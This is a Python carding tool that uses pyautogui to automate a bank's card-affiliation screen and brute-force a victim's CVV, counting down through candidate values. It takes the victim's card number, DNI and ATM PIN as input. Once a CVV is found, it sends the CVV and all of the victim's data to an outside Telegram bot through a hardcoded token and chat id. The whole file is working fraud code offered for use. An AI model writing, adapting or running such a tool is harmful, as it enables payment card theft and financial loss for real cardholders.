import pyautogui as robot
import time 
import telegram
import pyperclip3 as pc

afiliacion = 946,963
retroceder = 835,1011
Ndocumento = 1036,455
Ntarjeta = 1009,531
Nclavecajero = 1042,733
borrandoclick = 1141,889
CVV = 1020,328
pegar = 930,659
Continuar1 = 953,521
reintentar = 954,895
#reintentar = 1637,984
escape = 1150,121

# Este es miooo de Hasen
# no compartir por error, si eres alguien tmre me descuide 

bot_token2 = '1893337163:AAHXSEBf-9ibMf67B68lgYv7PNrekXlDNoE'
chat_id2 = '1850445278'
bot2 = telegram.Bot(token=bot_token2)

#bot.send_message(chat_id=chat_id, text = 'Corriendo bot :D')

#block
registro = open("registro.txt","a")
registro.write("Comenzando")
registro.write("\n")

#Pedir dato
print("\n")
print("El programa trabaja de manera descendente 999...998...997...")
print(" Para el fumon de crack movi ")
print("\n")
print("*****************")
print("Escriba los datos: ")


victima_tar = input("Tarjeta: ")
victima_dni = input("DNI: ")
victima_pasw = input("Clave de cajero: ")
# 6

print("*****************")

inicio = int(input("Desde que número desea comenzar?:  "))
fin = int(input("Hasta que número?:  "))

print("*****************")
print("Presione 'Enter' para continuar")
input()

#Mover y dar click
def abrir (pos,click = 1 ):
	robot.moveTo(pos)
	#pyautogui.moveTo(503,315)
	robot.click(clicks=click)

def logeo ():
	abrir(afiliacion,click=1)
	time.sleep(3)
	robot.click(774,509) # Clicktarjeta con datos impresos
	time.sleep(0.5)
	robot.click(957,744) # Click Continuar
	time.sleep(1) 

	abrir(Ndocumento)
	time.sleep(0.3)
	robot.typewrite(victima_dni, interval=0.03)

	time.sleep(1)
	
	abrir(Ntarjeta)
	pc.copy(victima_tar)
	time.sleep(0.4)
	robot.click(pegar)
	time.sleep(0.5)

	#robot.typewrite(victima_tar, interval=0.07)
	time.sleep(1)

	robot.click(retroceder) # Click retroceder

	time.sleep(1)
	abrir(Nclavecajero)
	time.sleep(1)
	robot.click(1136,414)  #clave de tarje 
	time.sleep(0.3)
	robot.click(1136,313) # click en cvv ojo
	time.sleep(0.3)
	robot.click(1136,313) # click en cvv ojo
	time.sleep(0.3)
	robot.click(1070,427) #clave de tarje 
	time.sleep(0.4)
	robot.typewrite(victima_pasw, interval=0.07)
	


print(":D")


logeo()
#input()
contador = 0 # para reiniciar 
inicio = inicio + 1

#Veces que intenta:
intentos = 4

while inicio>fin :  # >  < # desde 999 para abajo
	
	inicio = inicio - 1
	contador += 1
	#print(contador)
	if contador > intentos : # Reiniciar  #4 es lo normal
		print("Reiniciando, esperar por favor")
		abrir(escape)
		time.sleep(2)
		robot.click(afiliacion)
		time.sleep(1.5)

		logeo() # Logeandose de nuevo

		print("Continuando...")
		contador=1

	#print("Intentado con: ",inicio)

	registro = open("registro.txt","a")
	registro.write(str(inicio)) # escribir en el block
	registro.write("\n")
	registro.close()
	 # Borar quizas
	print("Intentando con: ",inicio)

	time.sleep(0.5)
	#print("Borrando") ##################
	abrir(CVV)
	#Borrando:
	time.sleep(1)
	robot.click(borrandoclick)
	robot.click(borrandoclick)
	robot.click(borrandoclick)
	time.sleep(0.5)
	#por si son bajos de 100
	if inicio < 100:
		robot.typewrite("0", interval=0.07)
		robot.typewrite(str(inicio))
		time.sleep(0.2)
		#print("Tipeando") #######################
	else:
		robot.typewrite(str(inicio), interval=0.07)
		time.sleep(0.2)
		#print("Tipeando") #########################
	time.sleep(0.3)
	#robot.click(retroceder)
	
	abrir(Continuar1)
	time.sleep(0.3)
	# Para ver cuanto demora en cargar
	imgAfi = "reintentar.png"
	img_cvv = "ceveve.png"
	blanco =  None
	ceveve = None
	blanco4intento = False

	contadorEmergencia = 0
	while blanco is None :
		contadorEmergencia += 1
		time.sleep(0.5)
		blanco = robot.locateOnScreen(imgAfi, grayscale=True, confidence=0.9, region=(887,870,152,55))
		#blanco = robot.pixelMatchesColor(1157,962,(255,255,253))
		ceveve = robot.locateOnScreen(img_cvv, grayscale=True, confidence=0.9, region=(747,485,419,176))
		#ceveve = robot.pixelMatchesColor(1086,521,(212,238,252))
		blanco4intento = robot.pixelMatchesColor(1148,324,(255,255,253))
		
		#print(blanco)
		#print(ceveve)
		#print(blanco4intento)
		#print("Cargando..."+ blanco)
		time.sleep(0.1)
		#print(contador)
		if (blanco!=None) and (contador < 4):
			print("!!")
			contadorEmergencia = 0
			time.sleep(0.1)
			abrir(reintentar)
			time.sleep(0.8)
		if (ceveve!=None):
			print ('\a')
			bot2.send_message(chat_id=chat_id2, text = "-------------")
			bot2.send_message(chat_id=chat_id2, text = 'CVV encontrada: '+str(inicio))
			bot2.send_message(chat_id=chat_id2, text = str(victima_tar))
			bot2.send_message(chat_id=chat_id2, text = str(victima_dni))
			bot2.send_message(chat_id=chat_id2, text = str(victima_pasw))

			print("CVV encontrado: "+ str(inicio))
			input ("Presione ' Enter ' para salir")
			quit()
			#input()

		if contadorEmergencia == 40:
			print("Detenido por EMERGENCIA (error)")
			#print("Enter para continuar o cierralo mejor")
			print("Reinicio final")
			contadorEmergencia = 0
			time.sleep(0.2)
			#robot.click(escape)
			#intentos = 1
			contador = 4
			inicio = inicio + 1
			break
			

		if (contador == 4):
			time.sleep(0.5)
			contadorEmergencia = 0
			#time.sleep(0.2)
			#robot.click(escape)
			#print("contador 4")
			break
	time.sleep(0.1)

	print("--------------------------------")
	#input(print("Continuar:"))

	time.sleep(0.2)



print("Presione 'Enter' para continuar")
input()



